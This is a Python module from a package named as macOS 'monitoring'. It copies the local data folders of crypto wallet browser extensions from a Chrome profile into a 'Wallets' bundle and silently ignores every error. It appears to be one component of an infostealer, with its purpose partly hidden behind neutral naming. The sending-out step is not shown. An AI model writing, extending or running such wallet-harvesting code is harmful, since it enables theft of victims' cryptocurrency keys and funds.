from os import path

from systoring.macosmonitoring.helpers.config import BrowsersConfig
from systoring.macosmonitoring.helpers.dataclasses import Data
from systoring.macosmonitoring.helpers.storage import MemoryStorage

class WS:
    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = BrowsersConfig()
        self.__storage = MemoryStorage()

    def __get_WS_files(self, profile: str) -> None:
        """
        Collects browser WS.

        Parameters:
        - profile [str]: Browser profile.
        - WS [str]: Path to WS directory.

        Returns:
        - None.
        """
        
        if not path.exists(self.__config.BrowsersPath):
            pass
            return

        for wallet in self.__config.WSLogs:
            for extension in wallet["folders"]:
                try:

                    extension_path = path.join(wallet["path"], extension)

                    if not path.exists(extension_path):
                        continue

                    self.__storage.add_from_disk(
                        extension_path,
                        path.join("Wallets", rf'Chrome {profile} {wallet["name"]}')
                    )

                    self.__storage.add_data("Wallet", wallet["name"])

                except Exception as e:
                    pass

    def run(self) -> Data:
        """
        Launches the crypto WS collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_WS_files("Default")

            return self.__storage.get_data()

        except Exception as e:
            pass